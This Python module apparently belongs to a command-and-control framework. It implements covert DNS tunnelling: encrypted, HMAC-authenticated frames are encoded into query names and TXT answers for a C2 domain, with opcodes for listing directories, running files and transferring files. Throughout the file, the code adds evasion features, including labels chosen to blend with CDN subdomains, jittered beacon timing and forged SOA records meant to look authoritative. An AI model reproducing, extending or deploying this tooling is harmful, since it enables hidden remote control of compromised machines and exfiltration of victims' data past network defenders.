#!/usr/bin/env python3

# *********************************************************
#
# Description: DNS transport framing, ChaCha20 encryption,
#              HMAC-SHA256 integrity, and payload chunking.
# Author: Moshe Yifrah
#
# *********************************************************

# --- Modules ---

from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import ipaddress
import math
import os
import random
import struct
import time
from typing import Final, List, Optional, Tuple
import scapy.all as scapy
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms

from . import cnc_crypto

# --- System Constants ---

DNS_PORT: int = 53
DNS_QNAME_TARGET_LEN: int = 120
DNS_NAME_MAX: Final[int] = 253
DNS_LABEL_MAX: Final[int] = 63

OPCODE_CMD: Final[int] = 0x01
OPCODE_RES: Final[int] = 0x02
OPCODE_ACK: Final[int] = 0x03
OPCODE_RESET: Final[int] = 0x04
OPCODE_SHUTDOWN: Final[int] = 0x05

CMD_KEEPALIVE: Final[int] = 0x00
CMD_LIST_DIR: Final[int] = 0x11
CMD_RUN_FILE: Final[int] = 0x22
CMD_FILE_TRANSFER: Final[int] = 0x33

FLAG_NONE: Final[int] = 0x00
FLAG_EOF: Final[int] = 0x01

HEADER_STRUCT: Final[struct.Struct] = struct.Struct("!BBBBIIH16s")

MIN_PAYLOAD: Final[int] = 8
MAX_BUFFER_LIMIT: Final[int] = 10 * 1024 * 1024

MAX_RETRANSMIT_ATTEMPTS: Final[int] = 5
DEFAULT_BASE_TIMEOUT: Final[float] = 0.5
MAX_TIMEOUT_VAL: Final[float] = 8.0
NETWORK_MULTIPLIER: Final[float] = 3.0
EXPONENTIAL_BACKOFF_FACTOR: Final[float] = 1.5
DISPATCHER_TIMEOUT: Final[float] = 1.0

_heartbeat_interval: float = 10.0
_LOGNORMAL_SIGMA: float = 0.35
_LOGNORMAL_MIN: float = 1.0

_c2_domain: str = "q.c2"

_measured_rtt: float = 0.3
_tx_start_time: Optional[float] = None
_transfer_id_counter: int = random.getrandbits(32)

# base32hex-lowercase [0-9a-v] — labels blend with CDN hash subdomains
_STD32 = b'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'
_C32   = b'0123456789abcdefghijklmnopqrstuv'
_ENC_TABLE = bytes.maketrans(_STD32, _C32)
_DEC_TABLE = bytes.maketrans(_C32, _STD32)


def _compute_max_data_size(domain: str) -> int:
    """Max application bytes per DNS chunk, accounting for label separators."""
    budget = DNS_QNAME_TARGET_LEN - len(domain) - 1
    max_b32_chars = 0
    for m in range(budget, 0, -1):
        num_labels = (m + DNS_LABEL_MAX - 1) // DNS_LABEL_MAX
        if m + num_labels - 1 <= budget:
            max_b32_chars = m
            break
    max_frame_bytes = (max_b32_chars * 5) // 8
    return max(0, max_frame_bytes - HEADER_STRUCT.size)


max_data_size: int = _compute_max_data_size(_c2_domain)

# ==============================================================================

# --- Functions ---

# ==============================================================================


def get_psk() -> bytes:
    """Retrieve the active session PSK."""
    return cnc_crypto.get_session_psk()


# ==============================================================================


def get_next_transfer_id() -> int:
    """Return next monotonic transfer ID (wraps at 32 bits, skips 0)."""
    global _transfer_id_counter
    _transfer_id_counter = (_transfer_id_counter + 1) & 0xFFFFFFFF
    if _transfer_id_counter == 0:
        _transfer_id_counter = 1
    return _transfer_id_counter


# ==============================================================================


def set_c2_domain(domain: str) -> None:
    """Override the C2 domain suffix used in DNS queries."""
    global _c2_domain, max_data_size
    _c2_domain = domain.rstrip('.')
    max_data_size = _compute_max_data_size(_c2_domain)


# ==============================================================================


def get_c2_domain() -> str:
    """Return the active C2 domain suffix."""
    return _c2_domain


# ==============================================================================


def set_heartbeat_interval(mean_seconds: float) -> None:
    """Override the log-normal beacon median (default 10.0 s)."""
    global _heartbeat_interval
    if mean_seconds < _LOGNORMAL_MIN:
        raise ValueError(
            f"heartbeat interval must be >= {_LOGNORMAL_MIN} s"
        )
    _heartbeat_interval = mean_seconds


# ==============================================================================


def get_heartbeat_interval() -> float:
    """Return a log-normal jittered beacon delay."""
    mu = math.log(_heartbeat_interval) - (_LOGNORMAL_SIGMA ** 2) / 2
    return max(_LOGNORMAL_MIN, random.lognormvariate(mu, _LOGNORMAL_SIGMA))


# ==============================================================================


def start_rtt_timer(is_retransmit: bool = False) -> None:
    """Record transmission start time; skipped on retransmits."""
    global _tx_start_time
    _tx_start_time = None if is_retransmit else time.perf_counter()


# ==============================================================================


def update_rtt_measurement() -> None:
    """Update exponential moving-average RTT on ACK receipt."""
    global _measured_rtt, _tx_start_time
    if _tx_start_time is not None:
        elapsed = time.perf_counter() - _tx_start_time
        _measured_rtt = (0.8 * _measured_rtt) + (0.2 * elapsed)
        _tx_start_time = None


# ==============================================================================


def get_adaptive_timeout(retry_count: int = 0) -> float:
    """Return backoff-scaled timeout based on current RTT estimate."""
    base = max(DEFAULT_BASE_TIMEOUT, _measured_rtt * NETWORK_MULTIPLIER)
    return min(
        MAX_TIMEOUT_VAL,
        base * (EXPONENTIAL_BACKOFF_FACTOR ** retry_count),
    )


# ==============================================================================


def validate_ipv4(address: str) -> str:
    """Validate and return an IPv4 address string (argparse type)."""
    try:
        ip = ipaddress.ip_address(address)
        if not isinstance(ip, ipaddress.IPv4Address):
            raise argparse.ArgumentTypeError("IPv4 signature violation.")
        return str(ip)
    except ValueError as exc:
        raise argparse.ArgumentTypeError(
            "Invalid target host layout."
        ) from exc


# ==============================================================================


def chunk_binary_payload(data_bytes: bytes) -> List[bytes]:
    """Split payload into max_data_size chunks."""
    if not data_bytes:
        return [b""]
    return [
        data_bytes[i:i + max_data_size]
        for i in range(0, len(data_bytes), max_data_size)
    ]


# ==============================================================================


def prepare_transfer_frames(
    raw_bytes_payload: bytes, net_opcode: int, app_opcode: int
) -> Tuple[int, List[Tuple[bytes, int]]]:
    """Encode all chunks of a payload into ARQ-ready (frame, seq) pairs."""
    chunks = chunk_binary_payload(raw_bytes_payload)
    total = len(chunks)
    psk = get_psk()
    transfer_id = get_next_transfer_id()
    frames = [
        (
            encode_frame(
                chunk, net_opcode, app_opcode,
                transfer_id, i + 1, i == total - 1, psk,
            ),
            i + 1,
        )
        for i, chunk in enumerate(chunks)
    ]
    return transfer_id, frames


# ==============================================================================


def serialize_header_fields(
    net_op: int, app_op: int, flags: int, reserved: int,
    tid: int, seq: int, plen: int
) -> bytes:
    """Pack frame header fields without the MAC field."""
    return struct.pack(
        "!BBBBIIH", net_op, app_op, flags, reserved, tid, seq, plen
    )


# ==============================================================================


def _crypt_payload(
    payload: bytes, psk: bytes, net_op: int, tid: int, seq: int
) -> bytes:
    """ChaCha20-encrypt or -decrypt payload in-place (symmetric)."""
    if not payload:
        return b""
    enc_key = hmac.new(psk, b"chacha20-enc-key", hashlib.sha256).digest()
    nonce = struct.pack("!IIII", 0, net_op, tid, seq & 0xFFFFFFFF)
    cipher = Cipher(algorithms.ChaCha20(enc_key, nonce), mode=None)
    return cipher.encryptor().update(payload)


# ==============================================================================


def _compute_frame_mac(
    psk: bytes, header_raw: bytes, ciphertext: bytes
) -> bytes:
    """Compute HMAC-SHA256 over header+ciphertext, truncated to 16 bytes."""
    mac_key = hmac.new(psk, b"hmac-auth-key", hashlib.sha256).digest()
    return hmac.new(
        mac_key, header_raw + ciphertext, hashlib.sha256
    ).digest()[:16]


# ==============================================================================


def encode_frame(
    chunk_bytes: bytes, net_opcode: int, app_opcode: int,
    transfer_id: int, seq_id: int, is_eof: bool, psk: bytes
) -> bytes:
    """Encrypt and MAC a data chunk into a wire-format frame."""
    flags = FLAG_EOF if is_eof else FLAG_NONE
    ciphertext = _crypt_payload(
        chunk_bytes, psk, net_opcode, transfer_id, seq_id
    )
    payload_len = len(ciphertext)
    header_raw = serialize_header_fields(
        net_opcode, app_opcode, flags, 0, transfer_id, seq_id, payload_len
    )
    mac = _compute_frame_mac(psk, header_raw, ciphertext)
    return HEADER_STRUCT.pack(
        net_opcode, app_opcode, flags, 0,
        transfer_id, seq_id, payload_len, mac
    ) + ciphertext


# ==============================================================================


def encode_control_frame(opcode: int, tid: int = 0, seq: int = 0) -> bytes:
    """Encode a zero-payload control frame (ACK, RESET, SHUTDOWN)."""
    return encode_frame(
        b"", opcode, CMD_KEEPALIVE, tid, seq, True, get_psk()
    )


# ==============================================================================


def decode_and_verify_frame(
    raw_payload: bytes, psk: bytes
) -> Optional[Tuple[int, int, int, int, int, bytes]]:
    """Verify HMAC and decrypt a raw frame; returns None on auth failure."""
    if len(raw_payload) < HEADER_STRUCT.size:
        return None
    net_op, app_op, flags, res, tid, seq, plen, rmac = HEADER_STRUCT.unpack(
        raw_payload[:HEADER_STRUCT.size]
    )
    expected_end = HEADER_STRUCT.size + plen
    if len(raw_payload) < expected_end:
        return None
    ciphertext = raw_payload[HEADER_STRUCT.size:expected_end]
    header_raw = serialize_header_fields(
        net_op, app_op, flags, res, tid, seq, plen
    )
    mac = _compute_frame_mac(psk, header_raw, ciphertext)
    if not hmac.compare_digest(mac, rmac):
        return None
    plaintext = _crypt_payload(ciphertext, psk, net_op, tid, seq)
    return net_op, app_op, flags, tid, seq, plaintext


# ==============================================================================


def _encode_dns_name(name: str) -> bytes:
    """Encode a dot-separated name as RFC 1035 length-prefixed labels."""
    return b''.join(
        bytes([len(lbl)]) + lbl.encode('ascii')
        for lbl in name.rstrip('.').split('.')
    ) + b'\x00'


# ==============================================================================


def _b32enc(data: bytes) -> str:
    """Encode bytes using base32hex-lowercase alphabet [0-9a-v]."""
    return (
        base64.b32encode(data).rstrip(b'=')
        .translate(_ENC_TABLE).decode('ascii')
    )


# ==============================================================================


def _b32dec(s: str) -> bytes:
    """Decode a base32hex-lowercase string back to bytes."""
    b = s.encode('ascii').translate(_DEC_TABLE)
    padding = (8 - len(b) % 8) % 8
    return base64.b32decode(b + b'=' * padding)


# ==============================================================================


def _frame_to_qname(frame_bytes: bytes) -> str:
    """Encode frame bytes as base32hex-lowercase DNS labels for the QNAME."""
    encoded = _b32enc(frame_bytes)
    labels = [
        encoded[i:i + DNS_LABEL_MAX]
        for i in range(0, len(encoded), DNS_LABEL_MAX)
    ]
    return '.'.join(labels) + '.' + _c2_domain + '.'


# ==============================================================================


def _qname_to_frame(qname_raw: bytes) -> Optional[bytes]:
    """Decode frame bytes from a DNS QNAME (base32hex-lowercase labels)."""
    try:
        qname = qname_raw.decode('ascii').rstrip('.')
        if not qname.endswith(_c2_domain):
            return None
        data_part = qname[: -len(_c2_domain)].rstrip('.')
        encoded = data_part.replace('.', '')
        if not encoded:
            return None
        return _b32dec(encoded)
    except Exception:
        return None


# ==============================================================================


def _build_soa_rdata() -> bytes:
    """Build SOA RDATA for the C2 zone (makes responses look authoritative)."""
    mname = _encode_dns_name(f'ns1.{_c2_domain}')
    rname = _encode_dns_name(f'hostmaster.{_c2_domain}')
    return (
        mname + rname
        + struct.pack('!IIIII', 2024010100, 3600, 900, 604800, 300)
    )


# ==============================================================================


def _frame_to_txt_rdata(frame_bytes: bytes) -> bytes:
    """Base32-encode frame as a TXT char-string with a 1-byte length prefix."""
    b32 = base64.b32encode(frame_bytes).rstrip(b'=')
    return bytes([len(b32)]) + b32


# ==============================================================================


def _txt_rdata_to_frame(rdata: bytes) -> Optional[bytes]:
    """Decode frame bytes from TXT RDATA by stripping the 1-byte length prefix."""
    try:
        if len(rdata) < 2:
            return None
        b32 = rdata[1:]
        padding = (8 - len(b32) % 8) % 8
        return base64.b32decode(b32 + b'=' * padding)
    except Exception:
        return None


# ==============================================================================


def build_dns_query(
    server_ip: str, frame_bytes: bytes, txid: int = 0, src_port: int = 0
) -> scapy.Packet:
    """Build a raw IP/UDP/DNS TXT query carrying frame_bytes in the QNAME."""
    sport = src_port or random.randint(1025, 65535)
    qname = _frame_to_qname(frame_bytes)
    return (
        IP(dst=server_ip) /
        UDP(sport=sport, dport=DNS_PORT) /
        DNS(id=txid, qr=0, rd=1, qdcount=1, arcount=1,
            qd=DNSQR(qname=qname, qtype='TXT', qclass='IN'),
            ar=DNSRR(rrname=b'.', type=41, rclass=4096, ttl=0, rdata=b''))
    )


# ==============================================================================


def build_dns_response(
    client_ip: str, client_port: int, qname: bytes,
    frame_bytes: bytes, txid: int = 0
) -> scapy.Packet:
    """Build a raw IP/UDP/DNS TXT response carrying frame_bytes in the answer."""
    ttl = random.randint(30, 300)
    zone = (_c2_domain + '.').encode('ascii')
    return (
        IP(dst=client_ip) /
        UDP(sport=DNS_PORT, dport=client_port) /
        DNS(id=txid, qr=1, aa=1, rd=0, ra=0,
            qdcount=1, ancount=1, nscount=1,
            qd=DNSQR(qname=qname, qtype='TXT', qclass='IN'),
            an=DNSRR(rrname=qname, type='TXT', ttl=ttl,
                     rdata=_frame_to_txt_rdata(frame_bytes)),
            ns=DNSRR(rrname=zone, type='SOA', ttl=300,
                     rdata=_build_soa_rdata()))
    )


# ==============================================================================


def is_valid_dns_query(packet: scapy.Packet) -> bool:
    """Return True if packet is a DNS TXT query for our C2 domain."""
    try:
        return (
            packet.haslayer(IP) and
            packet.haslayer(UDP) and
            packet.haslayer(DNS) and
            packet[DNS].qr == 0 and
            packet[DNS].qdcount >= 1 and
            _c2_domain.encode('ascii') in packet[DNS].qd.qname
        )
    except Exception:
        return False


# ==============================================================================


def is_valid_dns_response(packet: scapy.Packet) -> bool:
    """Return True if packet is a DNS TXT response with an answer."""
    try:
        return (
            packet.haslayer(IP) and
            packet.haslayer(UDP) and
            packet.haslayer(DNS) and
            packet[DNS].qr == 1 and
            packet[DNS].ancount >= 1
        )
    except Exception:
        return False


# ==============================================================================


def extract_frame_from_query(packet: scapy.Packet) -> Optional[bytes]:
    """Decode the frame bytes from a DNS query QNAME."""
    try:
        return _qname_to_frame(packet[DNS].qd.qname)
    except Exception:
        return None


# ==============================================================================


def extract_frame_from_response(packet: scapy.Packet) -> Optional[bytes]:
    """Extract frame bytes from a DNS TXT answer record."""
    try:
        rdata = packet[DNS].an[0].rdata
        if isinstance(rdata, list):
            rdata = b''.join(r for r in rdata if isinstance(r, bytes))
        if not isinstance(rdata, bytes):
            return None
        return _txt_rdata_to_frame(rdata)
    except Exception:
        return None
